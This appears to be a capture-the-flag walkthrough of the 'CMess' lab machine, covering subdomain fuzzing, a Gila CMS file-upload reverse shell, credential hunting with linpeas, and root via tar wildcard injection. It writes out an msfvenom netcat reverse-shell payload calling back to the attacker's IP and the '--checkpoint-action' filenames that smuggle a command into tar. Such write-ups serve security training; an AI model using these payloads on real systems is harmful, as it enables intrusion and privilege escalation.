As the challenge requires, we add the IP given to /etc/hosts.

Then we run nmap 
nmap -p- -A -T4 $IP 

which gave us these resulsts:

Host is up (0.062s latency).

By looking at the results we can understand that this is going to be some web-related stuff since we only have port 80(http) and 22(ssh) open.


Heading over to port 80 we see a simple and pretty empty home page.
Running gobuster on the site gives us quite a few entries back.

I did get a bit stuck here, after looking at the hint i run wfuzz againt the site to check for subdomains.

wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107 
which almost instantly gave us a result which looked interesting

Target: http://cmess.thm/
Total requests: 4989

We added dev.cmess.thm to /etc/hosts and navigated to the site and found credentials of andre@cmess.thm which we tried to the website admin panel at cmess.thm/admin


There are many ways to get a reverse shell in this machine

1)
As soon as we found the gila version we searched on searchsploit for any exploits
searchsploit gila

Gila CMS < 1.11.1 - Local File Inclusion
which is a local file inclusion by appending "/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts" and we have some upload functionality so we try to see if we can upload a shell.

We manage to upload a "reverse_shell.php" which goes to assets directory. We start a listener and then browse to "http://cmess.thm/assets/reverse_shell.php and get the server to process our payload.

2)
When we are in the admin panel we can upload a file via navigating to the left side of the panel hovering over Content and finding File Manager. There is no restriction for php files, so we simply uploaded the reverse shell while also starting a listener in the attacking machine. After this we have to find where the file was located, and since the file system is quite simple we navigated throuhg it by hand and found that it was in the asset folder.

we get "www-data"

we upgrade our shell
python3 -c "import pty;pty.spawn('/bin/bash')"

HORIZONTAL ESCALATION

What i usually do after managing to get a shell as a www-data is to check  the files  in the website folder since the user will have permissions to read those. In the /var/www/html there is a config.php file which contains mysql root credentials. We logged as root: mysql -u root -p but nothing interesting was found so it probably was a rabbit hole.

Then we started manually looking around the file system but it didnt give anything. What we found was at /etc/crontab a cronjob which was running a tar command to backup the andre users "backup" directory and everything on it, but it will be useful after we get andre user. We  decided to run linpeas.sh
We open a server on our machine a wget the file.
chmod +x linpeas.sh

./linpeas.sh -t for through mode

The results were interesting, a password backup file in the /opt folder called .password.bak which gives us access to andre password.

we got a better user and we have the right to cat the user.txt flag. We ssh as andre to the box.

VERTICAL ESCALATION

Okay we know that there's a backup service running on the server, we also could find the from the linpeas report

*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

There is a way to exploit tar it it uses wildcards. The name of the attack is wildcard injection and it's a way to make tar run an executable for us. Since the backup service is running as root, if we make this executable a reverse shell, then we got ourselves a root shell.

These two articles helped me understand the attack and get root:
- https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
- https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c

we need to create 2 directories and a shell.sh file inside /home/andre/backup directory that tar will see and interpret it as commands and execute.

we go /home/andre/backup

in the attacking maching we run:
msfvenom -p cmd/unix/reverse_netcat lhost=$Attacking_ip lport=8888 R

and we copy paste the result to the victim machine 

echo "mkfifo /tmp/lhennp; nc $Attacking_ip 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *

on our attacking machine we start a listener and after 1 minute we get a reverse connection from the victim.
